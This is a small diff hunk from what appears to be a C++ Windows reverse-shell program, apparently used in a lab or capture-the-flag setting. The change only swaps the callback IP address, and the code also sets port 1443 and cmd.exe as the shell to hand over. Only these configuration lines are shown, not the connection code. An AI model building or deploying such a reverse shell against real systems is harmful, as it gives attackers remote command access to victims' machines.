@@ -18,7 +18,7 @@ using namespace std;
 int main() {
 
 	// Change domain, port and shell executable if required
-	char* domain = "192.168.1.249";
+	char* domain = "10.10.14.147";
 	char* port = "1443";
 	wchar_t process[] = L"cmd.exe";
 
